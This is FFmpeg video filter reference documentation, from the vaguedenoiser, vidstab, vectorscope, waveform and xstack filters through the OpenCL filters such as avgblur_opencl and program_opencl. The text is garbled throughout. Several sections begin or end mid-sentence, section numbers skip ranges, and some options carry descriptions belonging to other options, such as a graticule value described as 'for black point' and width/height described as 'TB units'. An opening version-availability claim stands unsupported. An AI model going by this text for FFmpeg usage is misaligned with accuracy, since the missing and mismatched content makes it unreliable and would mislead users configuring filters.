This filter is not available in ffmpeg versions between 5.0 and 6.0.

The filter accepts the following options:

`quality`

Set quality. This option defines the number of levels for averaging. It accepts
an integer in the range 0-8. If set to `0`, the filter will have no
effect. A value of `8` means the higher quality. For each increment of
that value the speed drops by a factor of approximately 2. Default value is
`3`.

`qp`

Force a constant quantization parameter. If not set, the filter will use the QP
from the video stream (if available).

`codec`

Use specified codec instead of snow.

#### [11.272.2 Commands](#toc-Commands-149)

This filter supports subset of above options as [commands](#commands).

### [11.273 vaguedenoiser](#toc-vaguedenoiser)

Apply a wavelet based denoiser.

It transforms each frame from the video input into the wavelet domain,
using Cohen-Daubechies-Feauveau 9/7. Then it applies some filtering to
the obtained coefficients. It does an inverse wavelet transform after.
Due to wavelet properties, it should give a nice smoothed result, and
reduced noise, without blurring picture features.

This filter accepts the following options:

`threshold`

The filtering strength. The higher, the more filtered the video will be.
Hard thresholding can use a higher threshold than soft thresholding
before the video looks overfiltered. Default value is 2.

`method`

The filtering method the filter will use.

It accepts the following values:

‘`hard`’

All values under the threshold will be zeroed.

‘`soft`’

All values under the threshold will be zeroed. All values above will be
reduced by the threshold.

‘`garrote`’

Scales or nullifies coefficients - intermediary between (more) soft and
(less) hard thresholding.

Default is garrote.

`nsteps`

Number of times, the wavelet will decompose the picture. Picture can’t
be decomposed beyond a particular point (typically, 8 for a 640x480
frame - as 2^9 = 512 > 480). Valid values are integers between 1 and 32. Default value is 6.

`percent`

Partial of full denoising (limited coefficients shrinking), from 0 to 100. Default value is 85.

`planes`

A list of the planes to process. By default all planes are processed.

`type`

The threshold type the filter will use.

It accepts the following values:

‘`universal`’

Threshold used is same for all decompositions.

‘`bayes`’

Threshold used depends also on each decomposition coefficients.

Default is universal.

### [11.274 varblur](#toc-varblur)

Apply variable blur filter by using 2nd video stream to set blur radius.
The 2nd stream must have the same dimensions.

This filter accepts the following options:

`min_r`

Set min allowed radius. Allowed range is from 0 to 254. Default is 0.

`max_r`

Set max allowed radius. Allowed range is from 1 to 255. Default is 8.

`planes`

Set which planes to process. By default, all are used.

The `varblur` filter also supports the [framesync](#framesync) options.

#### [11.274.1 Commands](#toc-Commands-150)

This filter supports all the above options as [commands](#commands).

### [11.275 vectorscope](#toc-vectorscope)

Display 2 color component values in the two dimensional graph (which is called
a vectorscope).

This filter accepts the following options:

`mode, m`

Set vectorscope mode.

It accepts the following values:

‘`gray`’
‘`tint`’

Gray values are displayed on graph, higher brightness means more pixels have
same component color value on location in graph. This is the default mode.

‘`color`’

Gray values are displayed on graph. Surrounding pixels values which are not
present in video frame are drawn in gradient of 2 color components which are
set by option `x` and `y`. The 3rd color component is static.

‘`color2`’

Actual color components values present in video frame are displayed on graph.

‘`color3`’

Similar as color2 but higher frequency of same values `x` and `y`
on graph increases value of another color component, which is luminance by
default values of `x` and `y`.

‘`color4`’

Actual colors present in video frame are displayed on graph. If two different
colors map to same position on graph then color with higher value of component
not present in graph is picked.

‘`color5`’

Gray values are displayed on graph. Similar to `color` but with 3rd color
component picked from radial gradient.

`x`

Set which color component will be represented on X-axis. Default is `1`.

`y`

Set which color component will be represented on Y-axis. Default is `2`.

`intensity, i`

Set intensity, used by modes: gray, color, color3 and color5 for increasing brightness
of color component which represents frequency of (X, Y) location in graph.

`envelope, e`
‘`none`’

No envelope, this is default.

‘`instant`’

Instant envelope, even darkest single pixel will be clearly highlighted.

‘`peak`’

Hold maximum and minimum values presented in graph over time. This way you
can still spot out of range values without constantly looking at vectorscope.

‘`peak+instant`’

Peak and instant envelope combined together.

`graticule, g`

Set what kind of graticule to draw.

‘`none`’
‘`green`’

Draw graticule for black point.

‘`name`’

Draw color points short names.

`bgopacity, b`

Set background opacity.

`lthreshold, l`

Set low threshold for color component not represented on X or Y axis.
Values lower than this value will be ignored. Default is 0.
Note this value is multiplied with actual max possible value one pixel component
can have. So for 8-bit input and low threshold value of 0.1 actual threshold
is 0.1 \* 255 = 25.

`hthreshold, h`

Set high threshold for color component not represented on X or Y axis.
Values higher than this value will be ignored. Default is 1.
Note this value is multiplied with actual max possible value one pixel component
can have. So for 8-bit input and high threshold value of 0.9 actual threshold
is 0.9 \* 255 = 230.

`colorspace, c`

Set what kind of colorspace to use when drawing graticule.

‘`auto`’
‘`601`’
‘`709`’

Default is auto.

`tint0, t0`
`tint1, t1`

Set color tint for gray/tint vectorscope mode. By default both options are zero.
This means no tint, and output will remain gray.

### [11.276 vidstabdetect](#toc-vidstabdetect-1)

Analyze video stabilization/deshaking. Perform pass 1 of 2, see
[vidstabtransform](#vidstabtransform) for pass 2.

This filter generates a file with relative translation and rotation
transform information about subsequent frames, which is then used by
the [vidstabtransform](#vidstabtransform) filter.

To enable compilation of this filter you need to configure FFmpeg with
`--enable-libvidstab`.

This filter accepts the following options:

`result`

Set the path to the file used to write the transforms information.
Default value is `transforms.trf`.

`shakiness`

Set how shaky the video is and how quick the camera is. It accepts an
integer in the range 1-10, a value of 1 means little shakiness, a
value of 10 means strong shakiness. Default value is 5.

`accuracy`

Set the accuracy of the detection process. It must be a value in the
range 1-15. A value of 1 means low accuracy, a value of 15 means high
accuracy. Default value is 15.

`stepsize`

Set stepsize of the search process. The region around minimum is
scanned with 1 pixel resolution. Default value is 6.

`mincontrast`

Set minimum contrast. Below this value a local measurement field is
discarded. Must be a floating point value in the range 0-1. Default
value is 0.3.

`tripod`

Set reference frame number for tripod mode.

If enabled, the motion of the frames is compared to a reference frame
in the filtered stream, identified by the specified number. The idea
is to compensate all movements in a more-or-less static scene and keep
the camera view absolutely still.

If set to 0, it is disabled. The frames are counted starting from 1.

`show`

Show fields and transforms in the resulting frames. It accepts an
integer in the range 0-2. Default value is 0, which disables any
visualization.

`fileformat`

Format for the transforms data file to be written.
Acceptable values are

‘`ascii`’

Human-readable plain text

‘`binary`’

Binary format, roughly 40% smaller than `ascii`. (*default*)

#### [11.276.1 Examples](#toc-Examples-135)

  ```
  vidstabdetect

  ```
* Analyze strongly shaky movie and put the results in file
  `mytransforms.trf`:
  ```
  vidstabdetect=shakiness=10:accuracy=15:result="mytransforms.trf"

  ```
* Visualize the result of internal transformations in the resulting
  video:
  ```
  vidstabdetect=show=1

  ```
* Analyze a video with medium shakiness using `ffmpeg`:
  ```
  ffmpeg -i input -vf vidstabdetect=shakiness=5:show=1 dummy.avi

  ```

### [11.277 vidstabtransform](#toc-vidstabtransform-1)

Video stabilization/deshaking: pass 2 of 2,
see [vidstabdetect](#vidstabdetect) for pass 1.

Read a file with transform information for each frame and
apply/compensate them. Together with the [vidstabdetect](#vidstabdetect)
filter this can be used to deshake videos. See also
<http://public.hronopik.de/vid.stab>. It is important to also use
the [unsharp](#unsharp) filter, see below.

To enable compilation of this filter you need to configure FFmpeg with
`--enable-libvidstab`.

#### [11.277.1 Options](#toc-Options-4)

`input`

Set path to the file used to read the transforms. Default value is
`transforms.trf`.

`smoothing`

Set the number of frames (value\*2 + 1) used for lowpass filtering the
camera movements. Default value is 10.

For example a number of 10 means that 21 frames are used (10 in the
past and 10 in the future) to smoothen the motion in the video. A
larger value leads to a smoother video, but limits the acceleration of
the camera (pan/tilt movements). 0 is a special case where a static
camera is simulated.

absolute if set to 0. Default value is 0.

`zoom`

Set percentage to zoom. A positive value will result in a zoom-in
effect, a negative value in a zoom-out effect. Default value is 0 (no
zoom).

`optzoom`

Set optimal zooming to avoid borders.

Accepted values are:

‘`0`’

disabled

‘`1`’

optimal static zoom value is determined (only very strong movements
will lead to visible borders) (default)

‘`2`’

optimal adaptive zoom value is determined (no borders will be
visible), see `zoomspeed`

Note that the value given at zoom is added to the one calculated here.

`zoomspeed`

Set percent to zoom maximally each frame (enabled when
`optzoom` is set to 2). Range is from 0 to 5, default value is
0.25.

`interpol`

no interpolation

‘`linear`’

linear only horizontal

‘`bilinear`’

linear in both directions (default)

‘`bicubic`’

Use also `tripod` option of [vidstabdetect](#vidstabdetect).

`debug`

Increase log verbosity if set to 1. Also the detected global motions
are written to the temporary file `global_motions.trf`. Default
value is 0.

#### [11.277.2 Examples](#toc-Examples-136)

* Use `ffmpeg` for a typical stabilization with default values:
  ```
  ffmpeg -i inp.mpeg -vf vidstabtransform,unsharp=5:5:0.8:3:3:0.4 inp_stabilized.mpeg

  ```

  Note the use of the [unsharp](#unsharp) filter which is always recommended.
* Zoom in a bit more and load transform data from a given file:
  ```
  vidstabtransform=zoom=5:input="mytransforms.trf"

  ```
* Smoothen the video even more:
  ```
  vidstabtransform=smoothing=30

  ```

### [11.278 vflip](#toc-vflip)

Flip the input video vertically.

For example, to vertically flip a video with `ffmpeg`:

```
ffmpeg -i in.avi -vf "vflip" out.avi

```

### [11.279 vfrdet](#toc-vfrdet)

Detect variable frame rate video.

This filter tries to detect if the input is variable or constant frame rate.

At end it will output number of frames detected as having variable delta pts,
and ones with constant delta pts.
If there was frames with variable delta, than it will also show min, max and
average delta encountered.

### [11.280 vibrance](#toc-vibrance)

otherwise colors will be less saturated, more towards gray.

#### [11.280.1 Commands](#toc-Commands-151)

This filter supports the all above options as [commands](#commands).

### [11.281 vif](#toc-vif)

Obtain the average VIF (Visual Information Fidelity) between two input videos.

This filter takes two input videos.

Both input videos must have the same resolution and pixel format for
this filter to work correctly. Also it assumes that both inputs
have the same number of frames, which are compared one by one.

The obtained average VIF score is printed through the logging system.

The filter stores the calculated VIF score of each frame.

This filter also supports the [framesync](#framesync) options.

In the below example the input file `main.mpg` being processed is compared
with the reference file `ref.mpg`.

```
ffmpeg -i main.mpg -i ref.mpg -lavfi vif -f null -

```

### [11.282 vignette](#toc-vignette-1)

Make or reverse a natural vignetting effect.

The filter accepts the following options:

`angle, a`

Set lens angle expression as a number of radians.

The value is clipped in the `[0,PI/2]` range.

Default value: `"PI/5"`

`x0`
`y0`

Set center coordinates expressions. Respectively `"w/2"` and `"h/2"`
by default.

`mode`

Set forward/backward mode.

Available modes are:

‘`forward`’

The larger the distance from the central point, the darker the image becomes.

‘`backward`’

The larger the distance from the central point, the brighter the image becomes.
This can be used to reverse a vignette effect, though there is no automatic
detection to extract the lens `angle` and other settings (yet). It can
also be used to create a burning effect.

Default value is ‘`forward`’.

`eval`

Set evaluation mode for the expressions (`angle`, `x0`, `y0`).

It accepts the following values:

‘`init`’

Evaluate expressions only once during the filter initialization.

‘`frame`’

Evaluate expressions for each incoming frame. This is way slower than the
‘`init`’ mode since it requires all the scalers to be re-computed, but it
allows advanced dynamic expressions.

Default value is ‘`init`’.

`dither`

Set dithering to reduce the circular banding effects. Default is `1`
(enabled).

`aspect`

Set vignette aspect. This setting allows one to adjust the shape of the vignette.
Setting this value to the SAR of the input will make a rectangular vignetting
following the dimensions of the video.

Default is `1/1`.

#### [11.282.1 Expressions](#toc-Expressions)

The `alpha`, `x0` and `y0` expressions can contain the
following parameters.

`w`
`h`

TB units, NAN if undefined

`r`

frame rate of the input video, NAN if the input frame rate is unknown

`t`

the PTS (Presentation TimeStamp) of the filtered video frame,
expressed in seconds, NAN if undefined

`tb`

time base of the input video

#### [11.282.2 Examples](#toc-Examples-137)

* Apply simple strong vignetting effect:
  ```
  vignette=PI/4

  ```
* Make a flickering vignetting:
  ```
  vignette='PI/4+random(1)*PI/50':eval=frame

  ```

### [11.283 vmafmotion](#toc-vmafmotion)

Obtain the average VMAF motion score of a video.
It is one of the component metrics of VMAF.

The obtained average motion score is printed through the logging system.

The filter accepts the following options:

`stats_file`

If specified, the filter will use the named file to save the motion score of
each frame with respect to the previous frame.
When filename equals "-" the data is sent to standard output.

Example:

```
ffmpeg -i ref.mpg -vf vmafmotion -f null -

```

### [11.284 vstack](#toc-vstack-1)

Stack input videos vertically.

to create same output.

The filter accepts the following options:

`inputs`

Set number of input streams. Default is 2.

`shortest`

If set to 1, force the output to terminate when the shortest input
terminates. Default value is 0.

### [11.285 w3fdif](#toc-w3fdif)

Deinterlace the input video ("w3fdif" stands for "Weston 3 Field
Deinterlacing Filter").

Based on the process described by Martin Weston for BBC R&D, and
implemented based on the de-interlace algorithm written by Jim
Easterbrook for BBC R&D, the Weston 3 field deinterlacing filter
uses filter coefficients calculated by BBC R&D.

This filter uses field-dominance information in frame to decide which
of each pair of fields to place first in the output.
If it gets it wrong use [setfield](#setfield) filter before `w3fdif` filter.

There are two sets of filter coefficients, so called "simple"
and "complex". Which set of filter coefficients is used can
be set by passing an optional parameter:

`filter`

Set the interlacing filter coefficients. Accepts one of the following values:

‘`simple`’

Simple filter coefficient set.

‘`complex`’

More-complex filter coefficient set.

Default value is ‘`complex`’.

`mode`

The interlacing mode to adopt. It accepts one of the following values:

`frame`

Output one frame for each frame.

`field`

Output one frame for each field.

The default value is `field`.

`parity`

The picture field parity assumed for the input interlaced video. It accepts one
of the following values:

`tff`

Assume the top field is first.

`bff`

Assume the bottom field is first.

`auto`

Enable automatic detection of field parity.

The default value is `auto`.
If the interlacing is unknown or the decoder does not export this information,
top field first will be assumed.

`deint`

Specify which frames to deinterlace. Accepts one of the following values:

‘`all`’

Deinterlace all frames,

‘`interlaced`’

Only deinterlace frames marked as interlaced.

Default value is ‘`all`’.

#### [11.285.1 Commands](#toc-Commands-152)

This filter supports same [commands](#commands) as options.

### [11.286 waveform](#toc-waveform)

Video waveform monitor.

The waveform monitor plots color component intensity. By default luma
only. Each column of the waveform corresponds to a column of pixels in the
source video.

It accepts the following options:

`mode, m`

Can be either `row`, or `column`. Default is `column`.
In row mode, the graph on the left side represents color component value 0 and
the right side represents value = 255. In column mode, the top side represents
color component value = 0 and bottom side represents value = 255.

`intensity, i`

Set intensity. Smaller values are useful to find out how many values of the same
luminance are distributed across input rows/columns.
Default value is `0.04`. Allowed range is [0, 1].

`mirror, r`

Set mirroring mode. `0` means unmirrored, `1` means mirrored.
In mirrored mode, higher values will be represented on the left
side for `row` mode and at the top for `column` mode. Default is
`1` (mirrored).

`display, d`

Set display mode.
It accepts the following values:

‘`overlay`’

Presents information identical to that in the `parade`, except
that the graphs representing color components are superimposed directly
over one another.

This display mode makes it easier to spot relative differences or similarities
in overlapping areas of the color components that are supposed to be identical,
such as neutral whites, grays, or blacks.

‘`stack`’

Display separate graph for the color components side by side in
`row` mode or one below the other in `column` mode.

‘`parade`’

Display separate graph for the color components side by side in
`column` mode or one below the other in `row` mode.

Using this display mode makes it easy to spot color casts in the highlights
and shadows of an image, by comparing the contours of the top and the bottom
graphs of each waveform. Since whites, grays, and blacks are characterized
by exactly equal amounts of red, green, and blue, neutral areas of the picture
should display three waveforms of roughly equal width/height. If not, the
correction is easy to perform by making level adjustments the three waveforms.

Default is `stack`.

`components, c`

Set which color components to display. Default is 1, which means only luma
or red color component if input is in RGB colorspace. If is set for example to
7 it will display all 3 (if) available color components.

`envelope, e`
‘`none`’

No envelope, this is default.

‘`instant`’

Instant envelope, minimum and maximum values presented in graph will be easily
visible even with small `step` value.

‘`peak`’

Hold minimum and maximum values presented in graph across time. This way you
can still spot out of range values without constantly looking at waveforms.

‘`peak+instant`’

Peak and instant envelope combined together.

`filter, f`
‘`lowpass`’

No filtering, this is default.

‘`flat`’

Can be used to configure waveform so it is not
streched too much in one of directions.

‘`none`’

Set sample aspect ration to 1/1.

‘`size`’

Set sample aspect ratio to match input size of video

Default is ‘`none`’.

`input`

Set input formats for filter to pick from.
Can be ‘`all`’, for selecting from all available formats,
or ‘`first`’, for selecting first available format.
Default is ‘`first`’.

### [11.287 weave, doubleweave](#toc-weave_002c-doubleweave)

The `weave` takes a field-based video input and join
each two sequential fields into single frame, producing a new double
height clip with half the frame rate and half the frame count.

Default value of `0.5` will pick always median values, while `0` will pick
minimum values, and `1` maximum values.

#### [11.291.1 Commands](#toc-Commands-153)

This filter supports all above options as [commands](#commands), excluding option `inputs`.

### [11.292 xpsnr](#toc-xpsnr-1)

Obtain the average (across all input frames) and minimum (across all color plane averages)
eXtended Perceptually weighted peak Signal-to-Noise Ratio (XPSNR) between two input videos.

The XPSNR is a low-complexity psychovisually motivated distortion measurement algorithm for
assessing the difference between two video streams or images. This is especially useful for
objectively quantifying the distortions caused by video and image codecs, as an alternative
to a formal subjective test. The logarithmic XPSNR output values are in a similar range as
those of traditional [psnr](#psnr) assessments but better reflect human impressions of visual
coding quality. More details on the XPSNR measure, which essentially represents a blockwise
weighted variant of the PSNR measure, can be found in the following freely available papers:

* C. R. Helmrich, M. Siekmann, S. Becker, S. Bosse, D. Marpe, and T. Wiegand, "XPSNR: A
  Low-Complexity Extension of the Perceptually Weighted Peak Signal-to-Noise Ratio for
  High-Resolution Video Quality Assessment," in Proc. IEEE Int. Conf. Acoustics, Speech,
  Sig. Process. (ICASSP), virt./online, May 2020. <www.ecodis.de/xpsnr.htm>
* C. R. Helmrich, S. Bosse, H. Schwarz, D. Marpe, and T. Wiegand, "A Study of the
  Extended Perceptually Weighted Peak Signal-to-Noise Ratio (XPSNR) for Video Compression
  with Different Resolutions and Bit Depths," ITU Journal: ICT Discoveries, vol. 3, no.
  1, pp. 65 - 72, May 2020. <http://handle.itu.int/11.1002/pub/8153d78b-en>

When publishing the results of XPSNR assessments obtained using, e.g., this FFmpeg filter, a
reference to the above papers as a means of documentation is strongly encouraged. The filter
requires two input videos. The first input is considered a (usually not distorted) reference
source and is passed unchanged to the output, whereas the second input is a (distorted) test
signal. Except for the bit depth, these two video inputs must have the same pixel format. In
addition, for best performance, both compared input videos should be in YCbCr color format.

The obtained overall XPSNR values mentioned above are printed through the logging system. In
case of input with multiple color planes, we suggest reporting of the minimum XPSNR average.

The following parameter, which behaves like the one for the [psnr](#psnr) filter, is accepted:

`stats_file, f`

If specified, the filter will use the named file to save the XPSNR value of each individual
frame and color plane. When the file name equals "-", that data is sent to standard output.

This filter also supports the [framesync](#framesync) options.

#### [11.292.1 Examples](#toc-Examples-140)

* XPSNR analysis of two 1080p HD videos, ref\_source.yuv and test\_video.yuv, both at 24 frames
  per second, with color format 4:2:0, bit depth 8, and output of a logfile named "xpsnr.log":
  ```
  ffmpeg -s 1920x1080 -framerate 24 -pix_fmt yuv420p -i ref_source.yuv -s 1920x1080 -framerate
  24 -pix_fmt yuv420p -i test_video.yuv -lavfi xpsnr="stats_file=xpsnr.log" -f null -

  ```
* XPSNR analysis of two 2160p UHD videos, ref\_source.yuv with bit depth 8 and test\_video.yuv
  with bit depth 10, both at 60 frames per second with color format 4:2:0, no logfile output:
  ```
  ffmpeg -s 3840x2160 -framerate 60 -pix_fmt yuv420p -i ref_source.yuv -s 3840x2160 -framerate
  60 -pix_fmt yuv420p10le -i test_video.yuv -lavfi xpsnr="stats_file=-" -f null -

  ```

### [11.293 xstack](#toc-xstack-1)

Stack video inputs into custom layout.

All streams must be of same pixel format.

The filter accepts the following options:

`inputs`

Set number of input streams. Default is 2.

`layout`

Specify layout of inputs.
This option requires the desired layout configuration to be explicitly set by the user.
This sets position of each video input in output. Each input
is separated by ’|’.
The first number represents the column, and the second number represents the row.
Numbers start at 0 and are separated by ’\_’. Optionally one can use wX and hX,
where X is video input from which to take width or height.
Multiple values can be used when separated by ’+’. In such
case values are summed together.

Note that if inputs are of different sizes gaps may appear, as not all of
the output video frame will be filled. Similarly, videos can overlap each
other if their position doesn’t leave enough space for the full frame of
adjoining videos.

For 2 inputs, a default layout of `0_0|w0_0` (equivalent to
`grid=2x1`) is set. In all other cases, a layout or a grid must be set by
the user. Either `grid` or `layout` can be specified at a time.
Specifying both will result in an error.

`grid`

Specify a fixed size grid of inputs.
This option is used to create a fixed size grid of the input streams. Set the
grid size in the form `COLUMNSxROWS`. There must be `ROWS * COLUMNS`
input streams and they will be arranged as a grid with `ROWS` rows and
`COLUMNS` columns. When using this option, each input stream within a row
must have the same height and all the rows must have the same width.

If `grid` is set, then `inputs` option is ignored and is implicitly
set to `ROWS * COLUMNS`.

For 2 inputs, a default grid of `2x1` (equivalent to
`layout=0_0|w0_0`) is set. In all other cases, a layout or a grid must be
set by the user. Either `grid` or `layout` can be specified at a time.
Specifying both will result in an error.

`shortest`

If set to 1, force the output to terminate when the shortest input
terminates. Default value is 0.

`fill`

If set to valid color, all unused pixels will be filled with that color.
By default fill is set to none, so it is disabled.

#### [11.293.1 Examples](#toc-Examples-141)

  ```

  ```
  xstack=inputs=16:layout=0_0|0_h0|0_h0+h1|0_h0+h1+h2|w0_0|w0_h0|w0_h0+h1|w0_h0+h1+h2|w0+w4_0|
  w0+w4_h0|w0+w4_h0+h1|w0+w4_h0+h1+h2|w0+w4+w8_0|w0+w4+w8_h0|w0+w4+w8_h0+h1|w0+w4+w8_h0+h1+h2

  ```

  Note that if inputs are of different sizes, gaps or overlaps may occur.

  ```

### [11.298 zscale](#toc-zscale-1)

Scale (resize) the input video, using the z.lib library:
<https://github.com/sekrit-twc/zimg>. To enable compilation of this
filter, you need to configure FFmpeg with `--enable-libzimg`.

The zscale filter forces the output display aspect ratio to be the same
as the input, by changing the output sample aspect ratio.

If the input image format is different from the format requested by
the next filter, the zscale filter will convert the input to the
requested format.

#### [11.298.1 Options](#toc-Options-5)

The filter accepts the following options.

`width, w`
`height, h`

Set the output video dimension expression. Default value is the input
dimension.

If the width or w value is 0, the input width is used for
the output. If the height or h value is 0, the input height
is used for the output.

If one and only one of the values is -n with n >= 1, the zscale filter
will use a value that maintains the aspect ratio of the input image,
calculated from the other specified dimension. After that it will,
however, make sure that the calculated dimension is divisible by n and
adjust the value if necessary.

If both values are -n with n >= 1, the behavior will be identical to
both values being set to 0 as previously detailed.

See below for the list of accepted constants for use in the dimension
expression.

If the specified expression is not valid, it is kept at its current
value.

## [12 OpenCL Video Filters](#toc-OpenCL-Video-Filters)

Below is a description of the currently available OpenCL video filters.

To enable compilation of these filters you need to configure FFmpeg with
`--enable-opencl`.

Running OpenCL filters requires you to initialize a hardware device and to pass that device to all filters in any filter graph.

`-init_hw_device opencl[=name][:device[,key=value...]]`

Initialise a new hardware device of type opencl called name, using the
given device parameters.

`-filter_hw_device name`

Pass the hardware device called name to all filters in any filter graph.

For more detailed information see <https://www.ffmpeg.org/ffmpeg.html#Advanced-Video-options>

* Example of choosing the first device on the second platform and running avgblur\_opencl filter with default parameters on it.
  ```
  -init_hw_device opencl=gpu:1.0 -filter_hw_device gpu -i INPUT -vf "hwupload, avgblur_opencl, hwdownload" OUTPUT

  ```

Since OpenCL filters are not able to access frame data in normal memory, all frame data needs to be uploaded([hwupload](#hwupload)) to hardware surfaces connected to the appropriate device before being used and then downloaded([hwdownload](#hwdownload)) back to normal memory. Note that [hwupload](#hwupload) will upload to a surface with the same layout as the software frame, so it may be necessary to add a [format](#format) filter immediately before to get the input into the right format and [hwdownload](#hwdownload) does not support all formats on the output - it may be necessary to insert an additional [format](#format) filter immediately following in the graph to get the output in a supported format.

### [12.1 avgblur\_opencl](#toc-avgblur_005fopencl)

Apply average blur filter.

The filter accepts the following options:

`sizeX`

Set horizontal radius size.
Range is `[1, 1024]` and default value is `1`.

`planes`

Set which planes to filter. Default value is `0xf`, by which all planes are processed.

`sizeY`

Set vertical radius size. Range is `[1, 1024]` and default value is `0`. If zero, `sizeX` value will be used.

#### [12.1.1 Example](#toc-Example)

* Apply average blur filter with horizontal and vertical size of 3, setting each pixel of the output to the average value of the 7x7 region centered on it in the input. For pixels on the edges of the image, the region does not extend beyond the image boundaries, and so out-of-range coordinates are not used in the calculations.
  ```
  -i INPUT -vf "hwupload, avgblur_opencl=3, hwdownload" OUTPUT

  ```

### [12.2 boxblur\_opencl](#toc-boxblur_005fopencl)

Apply a boxblur algorithm to the input video.

It accepts the following parameters:

`luma_radius, lr`
`luma_power, lp`
`chroma_radius, cr`
`chroma_power, cp`
`alpha_radius, ar`
`alpha_power, ap`

A description of the accepted options follows.

`luma_radius, lr`
`chroma_radius, cr`
`alpha_radius, ar`

Set an expression for the box radius in pixels used for blurring the
corresponding input plane.

The radius value must be a non-negative number, and must not be
greater than the value of the expression `min(w,h)/2` for the
luma and alpha planes, and of `min(cw,ch)/2` for the chroma
planes.

Default value for `luma_radius` is "2". If not specified,
`chroma_radius` and `alpha_radius` default to the
corresponding value set for `luma_radius`.

The expressions can contain the following constants:

`w`
`h`

The input width and height in pixels.

`cw`
`ch`

The input chroma image width and height in pixels.

`hsub`
`vsub`

The horizontal and vertical chroma subsample values. For example, for the
pixel format "yuv422p", hsub is 2 and vsub is 1.

`luma_power, lp`
`chroma_power, cp`
`alpha_power, ap`

Specify how many times the boxblur filter is applied to the
corresponding plane.

Default value for `luma_power` is 2. If not specified,
`chroma_power` and `alpha_power` default to the
corresponding value set for `luma_power`.

A value of 0 will disable the effect.

#### [12.2.1 Examples](#toc-Examples-143)

Apply boxblur filter, setting each pixel of the output to the average value of box-radiuses luma\_radius, chroma\_radius, alpha\_radius for each plane respectively. The filter will apply luma\_power, chroma\_power, alpha\_power times onto the corresponding plane. For pixels on the edges of the image, the radius does not extend beyond the image boundaries, and so out-of-range coordinates are not used in the calculations.

* Apply a boxblur filter with the luma, chroma, and alpha radius
  set to 2 and luma, chroma, and alpha power set to 3. The filter will run 3 times with box-radius set to 2 for every plane of the image.

`debug`

Whether or not additional debug info should be displayed, both in the processed output and in the console.

Note that in order to see console debug output you will also need to pass `-v verbose` to ffmpeg.

Viewing point matches in the output video is only supported for RGB input.

Defaults to `0`.

`adaptive_crop`

Whether or not to do a tiny bit of cropping at the borders to cut down on the amount of mirrored pixels.

Defaults to `1`.

`refine_features`

Whether or not feature points should be refined at a sub-pixel level.

This can be turned off for a slight performance gain at the cost of precision.

Defaults to `1`.

`smooth_strength`

The strength of the smoothing applied to the camera path from `0.0` to `1.0`.

`1.0` is the maximum smoothing strength while values less than that result in less smoothing.

`0.0` causes the filter to adaptively choose a smoothing strength on a per-frame basis.

Defaults to `0.0`.

`smooth_window_multiplier`

Controls the size of the smoothing window (the number of frames buffered to determine motion information from).

The size of the smoothing window is determined by multiplying the framerate of the video by this number.

Acceptable values range from `0.1` to `10.0`.

Larger values increase the amount of motion data available for determining how to smooth the camera path,
potentially improving smoothness, but also increase latency and memory usage.

Defaults to `2.0`.

#### [12.6.1 Examples](#toc-Examples-146)

* Stabilize a video with a fixed, medium smoothing strength:
  ```
  -i INPUT -vf "hwupload, deshake_opencl=smooth_strength=0.5, hwdownload" OUTPUT

### [12.12 program\_opencl](#toc-program_005fopencl-1)

Filter video using an OpenCL program.

`source`

OpenCL program source file.

`kernel`

Kernel name in program.

`inputs`

Number of inputs to the filter. Defaults to 1.

`size, s`

Size of output frames. Defaults to the same as the first input.

The `program_opencl` filter also supports the [framesync](#framesync) options.

The program source file must contain a kernel function with the given name,
which will be run once for each plane of the output. Each run on a plane
gets enqueued as a separate 2D global NDRange with one work-item for each
pixel to be generated. The global ID offset for each work-item is therefore
the coordinates of a pixel in the destination image.

The kernel function needs to take the following arguments:

* Destination image, \_\_write\_only image2d\_t.

  This image will become the output; the kernel should write all of it.
* Frame index, unsigned int.

  This is a counter starting from zero and increasing by one for each frame.
* Source images, \_\_read\_only image2d\_t.

  These are the most recent images on each input. The kernel may read from
  them to generate the output, but they can’t be written to.

Example programs:

* Copy the input to the output (output must be the same size as the input).
  ```
  __kernel void copy(__write_only image2d_t destination,
                     unsigned int index,
                     __read_only  image2d_t source)
  {
      const sampler_t sampler = CLK_NORMALIZED_COORDS_FALSE;

      int2 location = (int2)(get_global_id(0), get_global_id(1));

      float4 value = read_imagef(source, sampler, location);

      write_imagef(destination, location, value);
  }

  ```
* Apply a simple transformation, rotating the input by an amount increasing
  with the index counter. Pixel values are linearly interpolated by the
  sampler, and the output need not have the same dimensions as the input.
  ```
  __kernel void rotate_image(__write_only image2d_t dst,
                             unsigned int index,
                             __read_only  image2d_t src)
  {
      const sampler_t sampler = (CLK_NORMALIZED_COORDS_FALSE |
                                 CLK_FILTER_LINEAR);

      float angle = (float)index / 100.0f;

      float2 dst_dim = convert_float2(get_image_dim(dst));
      float2 src_dim = convert_float2(get_image_dim(src));

      float2 dst_cen = dst_dim / 2.0f;
      float2 src_cen = src_dim / 2.0f;

      int2   dst_loc = (int2)(get_global_id(0), get_global_id(1));

      float2 dst_pos = convert_float2(dst_loc) - dst_cen;
      float2 src_pos = {
          cos(angle) * dst_pos.x - sin(angle) * dst_pos.y,
          sin(angle) * dst_pos.x + cos(angle) * dst_pos.y
      };
      src_pos = src_pos * src_dim / dst_dim;

      float2 src_loc = src_pos + src_cen;

      if (src_loc.x < 0.0f      || src_loc.y < 0.0f ||
          src_loc.x > src_dim.x || src_loc.y > src_dim.y)
          write_imagef(dst, dst_loc, 0.5f);
      else
          write_imagef(dst, dst_loc, read_imagef(src, sampler, src_loc));
  }

  ```
* Blend two inputs together, with the amount of each input used varying
  with the index counter.
  ```
  __kernel void blend_images(__write_only image2d_t dst,
                             unsigned int index,
                             __read_only  image2d_t src1,
                             __read_only  image2d_t src2)
  {
      const sampler_t sampler = (CLK_NORMALIZED_COORDS_FALSE |
                                 CLK_FILTER_LINEAR);

      float blend = (cos((float)index / 50.0f) + 1.0f) / 2.0f;

      int2  dst_loc = (int2)(get_global_id(0), get_global_id(1));
      int2 src1_loc = dst_loc * get_image_dim(src1) / get_image_dim(dst);
      int2 src2_loc = dst_loc * get_image_dim(src2) / get_image_dim(dst);

      float4 val1 = read_imagef(src1, sampler, src1_loc);
      float4 val2 = read_imagef(src2, sampler, src2_loc);

      write_imagef(dst, dst_loc, val1 * blend + val2 * (1.0f - blend));
  }

  ```

### [12.13 remap\_opencl](#toc-remap_005fopencl)

`tonemap`

Specify the tone-mapping operator to be used. Same as tonemap option in [tonemap](#tonemap).

`param`

Tune the tone mapping algorithm. same as param option in [tonemap](#tonemap).

`desat`

Apply desaturation for highlights that exceed this level of brightness. The
higher the parameter, the more color information will be preserved. This
setting helps prevent unnaturally blown-out colors for super-highlights, by
(smoothly) turning into white instead. This makes images feel more natural,
